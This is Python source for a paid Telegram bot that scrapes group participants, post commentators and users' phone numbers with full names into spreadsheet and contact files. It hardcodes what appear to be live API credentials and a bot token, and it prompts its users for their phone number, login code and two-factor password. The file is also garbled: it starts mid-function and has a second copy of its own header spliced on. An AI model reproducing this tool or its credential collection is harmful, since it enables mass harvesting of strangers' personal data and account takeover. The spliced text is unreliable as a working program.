        await log_to_channel(context, f"Пользователь @{username} начал парсинг" if lang == 'Русский' else 
                             f"Користувач @{username} почав парсинг" if lang == 'Украинский' else 
                             f"User @{username} started parsing" if lang == 'English' else 
                             f"Benutzer @{username} hat mit dem Parsen begonnen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'subscribe':
        await query.message.reply_text(texts['you_chose'].format(button="Оформить подписку" if lang == 'Русский' else "Оформити підписку" if lang == 'Украинский' else "Subscribe" if lang == 'English' else "Abonnement abschließen"))
        keyboard = [
            [InlineKeyboardButton(texts['subscription_1h'], callback_data='subscribe_1h')],
            [InlineKeyboardButton(texts['subscription_3d'], callback_data='subscribe_3d')],
            [InlineKeyboardButton(texts['subscription_7d'], callback_data='subscribe_7d')]
        ]
        await query.message.reply_text("Выберите подписку:" if lang == 'Русский' else "Виберіть підписку:" if lang == 'Украинский' else "Choose a subscription:" if lang == 'English' else "Wähle ein Abonnement:", reply_markup=InlineKeyboardMarkup(keyboard))
        await log_to_channel(context, f"Пользователь @{username} выбрал подписку" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав підписку" if lang == 'Украинский' else 
                             f"User @{username} chose a subscription" if lang == 'English' else 
                             f"Benutzer @{username} hat ein Abonnement ausgewählt", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'requisites':
        await query.message.reply_text(texts['you_chose'].format(button="Реквизиты" if lang == 'Русский' else "Реквізити" if lang == 'Украинский' else "Requisites" if lang == 'English' else "Zahlungsdaten"))
        await query.message.reply_text(texts['requisites'].format(support=SUPPORT_USERNAME))
        await log_to_channel(context, f"Пользователь @{username} запросил реквизиты" if lang == 'Русский' else 
                             f"Користувач @{username} запросив реквізити" if lang == 'Украинский' else 
                             f"User @{username} requested requisites" if lang == 'English' else 
                             f"Benutzer @{username} hat Zahlungsdaten angefordert", username)
        await client_telethon.disconnect()
        return
    
    if query.data in ['parse_authors', 'parse_participants', 'parse_post_commentators', 'parse_phone_contacts', 'parse_auth_access']:
        context.user_data['parse_type'] = query.data
        await query.message.reply_text(texts['you_chose'].format(button={
            'parse_authors': 'Авторов' if lang == 'Русский' else 'Авторів' if lang == 'Украинский' else 'Authors' if lang == 'English' else 'Autoren',
            'parse_participants': 'Участников' if lang == 'Русский' else 'Учасників' if lang == 'Украинский' else 'Participants' if lang == 'English' else 'Teilnehmer',
            'parse_post_commentators': 'Комментаторов поста' if lang == 'Русский' else 'Коментаторів поста' if lang == 'Украинский' else 'Post commentators' if lang == 'English' else 'Beitragskommentatoren',
            'parse_phone_contacts': texts['phone_contacts'],
            'parse_auth_access': texts['auth_access']
        }[query.data]))
        if query.data in ['parse_post_commentators', 'parse_auth_access']:
            await query.message.reply_text(texts['link_post'])
        else:
            await query.message.reply_text(texts['link_group'])
        await log_to_channel(context, f"Пользователь @{username} выбрал парсинг {query.data}" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав парсинг {query.data}" if lang == 'Украинский' else 
                             f"User @{username} chose parsing {query.data}" if lang == 'English' else 
                             f"Benutzer @{username} hat das Parsen von {query.data} ausgewählt", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'continue':
        menu_text, menu_markup = get_main_menu(user_id, context)
        await query.message.reply_text(menu_text, reply_markup=menu_markup)
        context.user_data.clear()
        context.user_data['user_id'] = user_id
        await log_to_channel(context, f"Пользователь @{username} продолжил работу" if lang == 'Русский' else 
                             f"Користувач @{username} продовжив роботу" if lang == 'Украинский' else 
                             f"User @{username} continued working" if lang == 'English' else 
                             f"Benutzer @{username} hat die Arbeit fortgesetzt", username)
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('limit_'):
        if query.data == 'limit_custom':
            context.user_data['waiting_for_limit'] = True
            await query.message.reply_text(texts['you_chose'].format(button="Другое" if lang == 'Русский' else "Інше" if lang == 'Украинский' else "Other" if lang == 'English' else "Andere"))
            await query.message.reply_text("Укажи своё число (максимум 15000):" if lang == 'Русский' else 
                                          "Вкажи своє число (максимум 15000):" if lang == 'Украинский' else 
                                          "Enter your number (maximum 15,000):" if lang == 'English' else 
                                          "Gib deine Zahl ein (maximal 15.000):", 
                                          reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
        else:
            context.user_data['limit'] = int(query.data.split('_')[1])
            await query.message.reply_text(texts['you_chose'].format(button=query.data.split('_')[1]))
            await ask_for_filters(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} установил лимит {context.user_data.get('limit', 'по умолчанию')}" if lang == 'Русский' else 
                             f"Користувач @{username} встановив ліміт {context.user_data.get('limit', 'за замовчуванням')}" if lang == 'Украинский' else 
                             f"User @{username} set limit to {context.user_data.get('limit', 'default')}" if lang == 'English' else 
                             f"Benutzer @{username} hat das Limit auf {context.user_data.get('limit', 'Standard')} gesetzt", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'skip_limit':
        context.user_data['limit'] = 1000
        context.user_data.pop('waiting_for_limit', None)
        await query.message.reply_text(texts['you_chose'].format(button="Пропустить" if lang == 'Русский' else "Пропустити" if lang == 'Украинский' else "Skip" if lang == 'English' else "Überspringen"))
        await ask_for_filters(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} пропустил лимит" if lang == 'Русский' else 
                             f"Користувач @{username} пропустив ліміт" if lang == 'Украинский' else 
                             f"User @{username} skipped the limit" if lang == 'English' else 
                             f"Benutzer @{username} hat das Limit übersprungen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'no_filter':
        context.user_data['limit'] = 15000 if users[str(user_id)]['subscription']['type'].startswith('Платная') else 150
        context.user_data['filters'] = {'only_with_username': False, 'exclude_bots': False, 'only_active': False}
        await query.message.reply_text(texts['you_chose'].format(button=texts['no_filter']))
        await process_parsing(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} выбрал парсинг без фильтров с лимитом {context.user_data['limit']}" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав парсинг без фільтрів з лімітом {context.user_data['limit']}" if lang == 'Украинский' else 
                             f"User @{username} chose parsing without filters with limit {context.user_data['limit']}" if lang == 'English' else 
                             f"Benutzer @{username} hat Parsen ohne Filter mit Limit {context.user_data['limit']} ausgewählt", username)
        await client_telethon.disconnect()
        return
    
    if query.data in ['filter_yes', 'filter_no', 'skip_filters']:
        filters = context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False})
        current_filter = context.user_data['current_filter']
        if query.data == 'filter_yes':
            filters[current_filter] = True
            await query.message.reply_text(texts['you_chose'].format(button="Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja"))
        elif query.data == 'filter_no':
            await query.message.reply_text(texts['you_chose'].format(button="Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein"))
        else:
            await query.message.reply_text(texts['you_chose'].format(button="Пропустить" if lang == 'Русский' else "Пропустити" if lang == 'Украинский' else "Skip" if lang == 'English' else "Überspringen"))
        
        if current_filter == 'only_with_username' and query.data != 'skip_filters':
            context.user_data['current_filter'] = 'exclude_bots'
            await query.message.reply_text(texts['filter_bots'], reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
                 InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
                [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
            ]))
        elif current_filter == 'exclude_bots' and query.data != 'skip_filters':
            context.user_data['current_filter'] = 'only_active'
            await query.message.reply_text(texts['filter_active'], reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
                 InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
                [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
            ]))
        else:
            del context.user_data['waiting_for_filters']
            del context.user_data['current_filter']
            context.user_data['filters'] = filters
            await process_parsing(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} установил фильтры: {filters}" if lang == 'Русский' else 
                             f"Користувач @{username} встановив фільтри: {filters}" if lang == 'Украинский' else 
                             f"User @{username} set filters: {filters}" if lang == 'English' else 
                             f"Benutzer @{username} hat Filter gesetzt: {filters}", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'fix_link':
        last_input = context.user_data.get('last_input', '')
        if not last_input:
            await query.message.reply_text(texts['retry_link'])
            await client_telethon.disconnect()
            return
        suggested_link = f"https://t.me/{last_input}" if not last_input.startswith('https://t.me/') else last_input
        keyboard = [
            [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data=f"confirm_link_{suggested_link}"),
             InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='retry_link')]
        ]
        await query.message.reply_text(texts['suggest_link'].format(link=suggested_link), reply_markup=InlineKeyboardMarkup(keyboard))
        await log_to_channel(context, f"Пользователь @{username} исправляет ссылку" if lang == 'Русский' else 
                             f"Користувач @{username} виправляє посилання" if lang == 'Украинский' else 
                             f"User @{username} is fixing the link" if lang == 'English' else 
                             f"Benutzer @{username} korrigiert den Link", username)
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('confirm_link_'):
        link = query.data.split('confirm_link_')[1]
        context.user_data['links'] = [link]
        await ask_for_limit(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} подтвердил ссылку: {link}" if lang == 'Русский' else 
                             f"Користувач @{username} підтвердив посилання: {link}" if lang == 'Украинский' else 
                             f"User @{username} confirmed the link: {link}" if lang == 'English' else 
                             f"Benutzer @{username} hat den Link bestätigt: {link}", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'retry_link':
        await query.message.reply_text(texts['retry_link'])
        await log_to_channel(context, f"Пользователь @{username} запросил повторный ввод ссылки" if lang == 'Русский' else 
                             f"Користувач @{username} запросив повторне введення посилання" if lang == 'Украинский' else 
                             f"User @{username} requested to re-enter the link" if lang == 'English' else 
                             f"Benutzer @{username} hat eine erneute Eingabe des Links angefordert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'close_id':
        await context.bot.delete_message(chat_id=query.message.chat_id, message_id=query.message.message_id)
        await log_to_channel(context, f"Пользователь @{username} закрыл сообщение с ID" if lang == 'Русский' else 
                             f"Користувач @{username} закрив повідомлення з ID" if lang == 'Украинский' else 
                             f"User @{username} closed the message with ID" if lang == 'English' else 
                             f"Benutzer @{username} hat die Nachricht mit ID geschlossen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'continue_id':
        await query.message.reply_text(texts['identifiers'])
        context.user_data['waiting_for_id'] = True
        await log_to_channel(context, f"Пользователь @{username} продолжил запрос ID" if lang == 'Русский' else 
                             f"Користувач @{username} продовжив запит ID" if lang == 'Украинский' else 
                             f"User @{username} continued requesting ID" if lang == 'English' else 
                             f"Benutzer @{username} hat die Anfrage nach ID fortgesetzt", username)
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('info_'):
        info_texts = {
            'info_identifiers': texts['identifiers'],
            'info_parser': "Доступен парсинг авторов, участников и комментаторов постов с фильтрами и лимитами (макс. 15000 для платных, 150 для бесплатных)." if lang == 'Русский' else
                          "Доступний парсинг авторів, учасників та коментаторів постів з фільтрами та лімітами (макс. 15000 для платних, 150 для безкоштовних)." if lang == 'Украинский' else
                          "Available parsing of authors, participants, and post commentators with filters and limits (max 15,000 for paid, 150 for free)." if lang == 'English' else
                          "Verfügbares Parsen von Autoren, Teilnehmern und Beitragskommentatoren mit Filtern und Limits (max. 15.000 für bezahlt, 150 für kostenlos).",
            'info_subscribe': "Подписка даёт доступ к дополнительным функциям (макс. 15000 пользователей). Свяжитесь с поддержкой для оплаты." if lang == 'Русский' else
                             "Підписка дає доступ до додаткових функцій (макс. 15000 користувачів). Зв’яжіться з підтримкою для оплати." if lang == 'Украинский' else
                             "Subscription gives access to additional features (max 15,000 users). Contact support for payment." if lang == 'English' else
                             "Das Abonnement gibt Zugang zu zusätzlichen Funktionen (max. 15.000 Benutzer). Kontaktiere den Support für die Zahlung.",
            'info_requisites': texts['requisites'].format(support=SUPPORT_USERNAME),
            'info_logs': texts['logs_channel']
        }
        await query.answer(text=info_texts[query.data], show_alert=True)
        await log_to_channel(context, f"Пользователь @{username} запросил информацию: {query.data}" if lang == 'Русский' else 
                             f"Користувач @{username} запросив інформацію: {query.data}" if lang == 'Украинский' else 
                             f"User @{username} requested information: {query.data}" if lang == 'English' else 
                             f"Benutzer @{username} hat Informationen angefordert: {query.data}", username)
        await client_telethon.disconnect()
        return
    
    if query.data in ['subscribe_1h', 'subscribe_3d', 'subscribe_7d']:
        context.user_data['selected_subscription'] = query.data.replace('subscribe_', '')
        amount = {'1h': 2, '3d': 5, '7d': 7}[context.user_data['selected_subscription']]
        await query.message.reply_text(texts['payment_wallet'].format(amount=amount, address=TON_WALLET_ADDRESS), reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(texts['payment_cancel'], callback_data='cancel_payment')],
            [InlineKeyboardButton(texts['payment_paid'], callback_data='payment_paid')]
        ]))
        await log_to_channel(context, f"Пользователь @{username} выбрал подписку: {context.user_data['selected_subscription']}" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав підписку: {context.user_data['selected_subscription']}" if lang == 'Украинский' else 
                             f"User @{username} chose subscription: {context.user_data['selected_subscription']}" if lang == 'English' else 
                             f"Benutzer @{username} hat Abonnement ausgewählt: {context.user_data['selected_subscription']}", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'cancel_payment':
        context.user_data.clear()
        await query.message.reply_text("Оплата отменена." if lang == 'Русский' else "Оплату скасовано." if lang == 'Украинский' else "Payment canceled." if lang == 'English' else "Zahlung abgebrochen.")
        await log_to_channel(context, f"Пользователь @{username} отменил оплату" if lang == 'Русский' else 
                             f"Користувач @{username} скасував оплату" if lang == 'Украинский' else 
                             f"User @{username} canceled payment" if lang == 'English' else 
                             f"Benutzer @{username} hat die Zahlung abgebrochen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'payment_paid':
        await query.message.reply_text(texts['payment_hash'])
        context.user_data['waiting_for_hash'] = True
        await log_to_channel(context, f"Пользователь @{username} указал, что оплатил подписку" if lang == 'Русский' else 
                             f"Користувач @{username} вказав, що оплатив підписку" if lang == 'Украинский' else 
                             f"User @{username} indicated that the subscription was paid" if lang == 'English' else 
                             f"Benutzer @{username} hat angegeben, dass das Abonnement bezahlt wurde", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'update_payment':
        await check_payment_status(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} обновил информацию о платеже" if lang == 'Русский' else 
                             f"Користувач @{username} оновив інформацію про платіж" if lang == 'Украинский' else 
                             f"User @{username} updated payment information" if lang == 'English' else 
                             f"Benutzer @{username} hat die Zahlungsinformationen aktualisiert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'logs_channel':
        if str(user_id) not in ADMIN_IDS:
            await query.message.reply_text("У вас нет доступа к этой функции." if lang == 'Русский' else 
                                          "У вас немає доступу до цієї функції." if lang == 'Украинский' else 
                                          "You don’t have access to this function." if lang == 'English' else 
                                          "Du hast keinen Zugriff auf diese Funktion.")
            await client_telethon.disconnect()
            return
        await query.message.reply_text(texts['logs_channel'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Перейти в канал" if lang == 'Русский' else "Перейти до каналу" if lang == 'Украинский' else "Go to channel" if lang == 'English' else "Zum Kanal gehen", url=f"https://t.me/{LOG_CHANNEL_ID.replace('-100', '')}")]]))
        await log_to_channel(context, f"Администратор @{username} запросил канал с логами" if lang == 'Русский' else 
                             f"Адміністратор @{username} запросив канал з логами" if lang == 'Украинский' else 
                             f"Administrator @{username} requested the logs channel" if lang == 'English' else 
                             f"Administrator @{username} hat den Kanal mit Logs angefordert", username)
        await client_telethon.disconnect()
        return

# Основная функция
async def main():
    try:
        await client_telethon.connect()
        print("Telethon клиент успешно подключён")

        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("language", language))
        application.add_handler(CommandHandler("set_plan", set_plan))
        application.add_handler(CommandHandler("remove_plan", remove_plan))
        application.add_handler(CommandHandler("note", note))
        application.add_handler(CallbackQueryHandler(button))
        application.add_handler(MessageHandler(filters.TEXT | filters.FORWARDED, handle_message))
        
        await application.initialize()
        await application.start()
        print("Бот запущен, начинаем polling...")
        
        await application.updater.start_polling(drop_pending_updates=True)
        await asyncio.Future()  # Бесконечный цикл

    except Exception as e:
        print(f"Ошибка при запуске: {str(e)}\n{traceback.format_exc()}")
    finally:
        print("Завершаем работу...")
        if 'application' in locals():
            await application.updater.stop()
            await application.stop()
            await application.shutdown()
        await client_telethon.disconnect()
        sys.exit(1)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Программа остановлена пользователем")
    except Exception as e:
        print(f"Ошибка в главном цикле: {str(e)}\n{traceback.format_exc()}")import asyncio
import os
import sys
import traceback
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, errors as telethon_errors
from telethon import tl
from telegram import error as telegram_error
from datetime import datetime, timedelta
import json
import io
import pandas as pd
import requests
import vobject

# Указываем переменные через код или переменные среды
API_ID = int(os.environ.get('API_ID', 25281388))
API_HASH = os.environ.get('API_HASH', 'a2e719f61f40ca912567c7724db5764e')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7981019134:AAHGkn_2ACcS76NbtQDY7L7pAONIPmMSYoA')
LOG_CHANNEL_ID = -1002342891238
SUBSCRIPTION_CHANNEL_ID = -1002425905138
SUPPORT_USERNAME = '@alex_strayker'
TON_WALLET_ADDRESS = 'UQAP4wrP0Jviy03CTeniBjSnAL5UHvcMFtxyi1Ip1exl9pLu'
TON_API_KEY = os.environ.get('TON_API_KEY', 'YOUR_TON_API_KEY')
ADMIN_IDS = ['2037127199']

# Создание клиента Telethon
client_telethon = TelegramClient('session_name', API_ID, API_HASH)

# База данных пользователей
DB_FILE = 'users.json'
if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w') as f:
        json.dump({}, f)

def load_users():
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Языковые переводы для всех языков
LANGUAGES = {
    'Русский': {
        'welcome': 'Привет! Выбери язык общения:',
        'enter_phone': 'Введите номер телефона в формате +380639678038 для авторизации:',
        'enter_code': 'Введите код подтверждения, который вы получили в SMS или Telegram:',
        'enter_password': 'Требуется пароль двухфакторной аутентификации. Введите пароль:',
        'auth_success': 'Авторизация успешно завершена!',
        'auth_error': 'Ошибка авторизации: {error}. Попробуйте снова с /start.',
        'choose_language': 'Выбери язык:',
        'subscribe': 'Подпишись на канал: t.me/VideoStreamLog\nПосле подписки нажми "Продолжить".',
        'subscribed': 'Продолжить',
        'you_chose': 'Вы выбрали: {button}',
        'skip': 'Пропустить',
        'start_menu': 'Вы: {name}\nВаш ID: {user_id}\nВыбран язык: {lang} /language\nТип подписки: {sub_type}\nВаша подписка закончится через: {sub_time}\nВсего запросов сделано: {requests}\nОсталось запросов сегодня: {limit}',
        'identifiers': 'Отправь мне @username, ссылку на публикацию или перешли сообщение, чтобы узнать ID.',
        'parser': 'Выбери, что хочешь спарсить:',
        'subscribe_button': 'Оформить подписку',
        'support': 'Поддержка: {support}',
        'requisites': 'Возможности оплаты:\n1. [Метод 1]\n2. [Метод 2]\nСвяжитесь с {support} для оплаты.',
        'logs_channel': 'Канал с логами: t.me/YourLogChannel',
        'link_group': 'Отправь мне ссылку на группу или канал, например: https://t.me/group_name\nМожно указать несколько ссылок через Enter.',
        'link_post': 'Отправь мне ссылку на пост, например: https://t.me/channel_name/12345\nИли перешли пост. Можно указать несколько ссылок через Enter.',
        'limit': 'Сколько пользователей парсить? Выбери или укажи своё число (макс. 15000 для платных подписок, 150 для бесплатной).',
        'filter_username': 'Фильтровать только пользователей с username?',
        'filter_bots': 'Исключить ботов?',
        'filter_active': 'Только активных недавно (за 30 дней)?',
        'invalid_limit': 'Укажи число от 1 до {max_limit}!',
        'invalid_number': 'Пожалуйста, укажи число!',
        'invalid_link': 'Пожалуйста, отправь корректную ссылку на пост, например: https://t.me/channel_name/12345\nИли несколько ссылок через Enter.',
        'fix_link': 'Если ты ошибся, могу помочь исправить ссылку.',
        'suggest_link': 'Ты имел в виду: {link}?',
        'retry_link': 'Отправь ссылку заново:',
        'no_access': 'Ошибка: у меня нет доступа к {link}. Убедись, что я добавлен в чат или он публичный.',
        'flood_error': 'Ошибка: {e}',
        'rpc_error': 'Ошибка: {e}',
        'new_user': 'Новый пользователь: @{username} (ID: {user_id})',
        'language_cmd': 'Выбери новый язык:',
        'caption_commentators': 'Вот ваш файл с комментаторами.',
        'caption_participants': 'Вот ваш файл с участниками.',
        'caption_post_commentators': 'Вот ваш файл с комментаторами поста.',
        'limit_reached': 'Ты исчерпал дневной лимит ({limit} запросов). Попробуй снова через {hours} часов.',
        'id_result': 'ID: {id}',
        'close': 'Закрыть',
        'continue_id': 'Продолжить',
        'subscription_1h': 'Подписка на 1 час - 2 USDT (TON)',
        'subscription_3d': 'Подписка на 3 дня - 5 USDT (TON)',
        'subscription_7d': 'Подписка на 7 дней - 7 USDT (TON)',
        'payment_wallet': 'Переведите {amount} USDT на кошелёк TON:\n{address}\nПосле оплаты нажмите "Я оплатил".',
        'payment_cancel': 'Отменить',
        'payment_paid': 'Я оплатил',
        'payment_hash': 'Отправьте хеш транзакции:',
        'payment_pending': 'Ожидается поступление средств',
        'payment_update': 'Обновить информацию',
        'payment_success': 'Платёж успешно подтверждён! Ваша подписка активирована до {end_time}.',
        'payment_error': 'Ошибка при проверке платежа: {error}',
        'entity_error': 'Не удалось получить информацию о пользователе. Пользователь может быть приватным или недоступным.',
        'no_filter': 'Не применять фильтр',
        'phone_contacts': 'Сбор номеров телефонов и ФИО',
        'auth_access': 'Авторизация для закрытых чатов',
        'caption_phones': 'Вот ваш файл с номерами телефонов и ФИО (Excel и VCF).',
        'auth_request': 'Для доступа к закрытым чатам добавьте бота в чат как администратора или отправьте ссылку на закрытый чат.',
        'auth_success': 'Доступ к закрытому чату успешно предоставлен!',
        'auth_error': 'Не удалось получить доступ. Убедитесь, что бот добавлен как администратор или чат публичный.',
        'note_cmd': 'Заметка успешно сохранена (бот не будет реагировать).'
    },
    'Украинский': {
        'welcome': 'Привіт! Обери мову спілкування:',
        'enter_phone': 'Введи номер телефону у форматі +380639678038 для авторизації:',
        'enter_code': 'Введи код підтвердження, який ти отримав у SMS або Telegram:',
        'enter_password': 'Потрібен пароль двофакторної аутентифікації. Введи пароль:',
        'auth_success': 'Авторизація успішно завершена!',
        'auth_error': 'Помилка авторизації: {error}. Спробуй знову з /start.',
        'choose_language': 'Обери мову:',
        'subscribe': 'Підпишись на канал: t.me/VideoStreamLog\nПісля підписки натисни "Продовжити".',
        'subscribed': 'Продовжити',
        'you_chose': 'Ви обрали: {button}',
        'skip': 'Пропустити',
        'start_menu': 'Ви: {name}\nВаш ID: {user_id}\nОбрана мова: {lang} /language\nТип підписки: {sub_type}\nВаша підписка закінчиться через: {sub_time}\nВсього запитів зроблено: {requests}\nЗалишилось запитів сьогодні: {limit}',
        'identifiers': 'Надішли мені @username, посилання на публікацію або перешли повідомлення, щоб дізнатися ID.',
        'parser': 'Обери, що хочеш спарсити:',
        'subscribe_button': 'Оформити підписку',
        'support': 'Підтримка: {support}',
        'requisites': 'Можливості оплати:\n1. [Метод 1]\n2. [Метод 2]\nЗв’яжіться з {support} для оплати.',
        'logs_channel': 'Канал з логами: t.me/YourLogChannel',
        'link_group': 'Надішли мені посилання на групу або канал, наприклад: https://t.me/group_name\nМожна вказати кілька посилань через Enter.',
        'link_post': 'Надішли мені посилання на пост, наприклад: https://t.me/channel_name/12345\nАбо перешли пост. Можна вказати кілька посилань через Enter.',
        'limit': 'Скільки користувачів парсити? Обери або вкажи своє число (макс. 15000 для платних підписок, 150 для безкоштовної).',
        'filter_username': 'Фільтрувати лише користувачів з username?',
        'filter_bots': 'Виключити ботів?',
        'filter_active': 'Тільки активних нещодавно (за 30 днів)?',
        'invalid_limit': 'Вкажи число від 1 до {max_limit}!',
        'invalid_number': 'Будь ласка, вкажи число!',
        'invalid_link': 'Будь ласка, надішли коректне посилання на пост, наприклад: https://t.me/channel_name/12345\nАбо кілька посилань через Enter.',
        'fix_link': 'Якщо ти помилився, можу допомогти виправити посилання.',
        'suggest_link': 'Ти мав на увазі: {link}?',
        'retry_link': 'Надішли посилання заново:',
        'no_access': 'Помилка: у мене немає доступу до {link}. Переконайся, що я доданий до чату або він публічний.',
        'flood_error': 'Помилка: {e}',
        'rpc_error': 'Помилка: {e}',
        'new_user': 'Новий користувач: @{username} (ID: {user_id})',
        'language_cmd': 'Обери нову мову:',
        'caption_commentators': 'Ось ваш файл з коментаторами.',
        'caption_participants': 'Ось ваш файл з учасниками.',
        'caption_post_commentators': 'Ось ваш файл з коментаторами поста.',
        'limit_reached': 'Ти вичерпав денний ліміт ({limit} запитів). Спробуй знову через {hours} годин.',
        'id_result': 'ID: {id}',
        'close': 'Закрити',
        'continue_id': 'Продовжити',
        'subscription_1h': 'Підписка на 1 годину - 2 USDT (TON)',
        'subscription_3d': 'Підписка на 3 дні - 5 USDT (TON)',
        'subscription_7d': 'Підписка на 7 днів - 7 USDT (TON)',
        'payment_wallet': 'Переведіть {amount} USDT на гаманець TON:\n{address}\nПісля оплати натисніть "Я оплатив".',
        'payment_cancel': 'Скасувати',
        'payment_paid': 'Я оплатив',
        'payment_hash': 'Надішліть хеш транзакції:',
        'payment_pending': 'Очікується надходження коштів',
        'payment_update': 'Оновити інформацію',
        'payment_success': 'Платіж успішно підтверджений! Ваша підписка активована до {end_time}.',
        'payment_error': 'Помилка при перевірці платежу: {error}',
        'entity_error': 'Не вдалося отримати інформацію про користувача. Користувач може бути приватним або недоступним.',
        'no_filter': 'Не застосовувати фільтр',
        'phone_contacts': 'Збір номерів телефонів та ПІБ',
        'auth_access': 'Авторизація для закритих чатів',
        'caption_phones': 'Ось ваш файл з номерами телефонів та ПІБ (Excel і VCF).',
        'auth_request': 'Для доступу до закритих чатів додайте бота в чат як адміністратора або надішліть посилання на закритий чат.',
        'auth_success': 'Доступ до закритого чату успішно надано!',
        'auth_error': 'Не вдалося отримати доступ. Переконайтесь, що бот доданий як адміністратор або чат публічний.',
        'note_cmd': 'Примітка успішно збережено (бот не реагуватиме).'
    },
    'English': {
        'welcome': 'Hello! Choose your language:',
        'enter_phone': 'Enter your phone number in the format +380639678038 for authorization:',
        'enter_code': 'Enter the confirmation code you received via SMS or Telegram:',
        'enter_password': 'Two-factor authentication password required. Enter your password:',
        'auth_success': 'Authorization completed successfully!',
        'auth_error': 'Authorization error: {error}. Try again with /start.',
        'choose_language': 'Choose language:',
        'subscribe': 'Subscribe to the channel: t.me/VideoStreamLog\nAfter subscribing, press "Continue".',
        'subscribed': 'Continue',
        'you_chose': 'You chose: {button}',
        'skip': 'Skip',
        'start_menu': 'You: {name}\nYour ID: {user_id}\nSelected language: {lang} /language\nSubscription type: {sub_type}\nYour subscription ends in: {sub_time}\nTotal requests made: {requests}\nRequests left today: {limit}',
        'identifiers': 'Send me @username, a post link, or forward a message to find out the ID.',
        'parser': 'Choose what you want to parse:',
        'subscribe_button': 'Subscribe',
        'support': 'Support: {support}',
        'requisites': 'Payment options:\n1. [Method 1]\n2. [Method 2]\nContact {support} for payment.',
        'logs_channel': 'Logs channel: t.me/YourLogChannel',
        'link_group': 'Send me a link to a group or channel, e.g.: https://t.me/group_name\nYou can specify multiple links via Enter.',
        'link_post': 'Send me a link to a post, e.g.: https://t.me/channel_name/12345\nOr forward a post. You can specify multiple links via Enter.',
        'limit': 'How many users to parse? Choose or enter your number (max 15,000 for paid subscriptions, 150 for free).',
        'filter_username': 'Filter only users with username?',
        'filter_bots': 'Exclude bots?',
        'filter_active': 'Only recently active (within 30 days)?',
        'invalid_limit': 'Enter a number from 1 to {max_limit}!',
        'invalid_number': 'Please enter a number!',
        'invalid_link': 'Please send a valid post link, e.g.: https://t.me/channel_name/12345\nOr multiple links via Enter.',
        'fix_link': 'If you made a mistake, I can help fix the link.',
        'suggest_link': 'Did you mean: {link}?',
        'retry_link': 'Send the link again:',
        'no_access': 'Error: I don’t have access to {link}. Make sure I’m added to the chat or it’s public.',
        'flood_error': 'Error: {e}',
        'rpc_error': 'Error: {e}',
        'new_user': 'New user: @{username} (ID: {user_id})',
        'language_cmd': 'Choose a new language:',
        'caption_commentators': 'Here is your file with commentators.',
        'caption_participants': 'Here is your file with participants.',
        'caption_post_commentators': 'Here is your file with post commentators.',
        'limit_reached': 'You’ve reached the daily limit ({limit} requests). Try again in {hours} hours.',
        'id_result': 'ID: {id}',
        'close': 'Close',
        'continue_id': 'Continue',
        'subscription_1h': '1 Hour Subscription - 2 USDT (TON)',
        'subscription_3d': '3 Days Subscription - 5 USDT (TON)',
        'subscription_7d': '7 Days Subscription - 7 USDT (TON)',
        'payment_wallet': 'Transfer {amount} USDT to the TON wallet:\n{address}\nAfter payment, press "I Paid".',
        'payment_cancel': 'Cancel',
        'payment_paid': 'I Paid',
        'payment_hash': 'Send the transaction hash:',
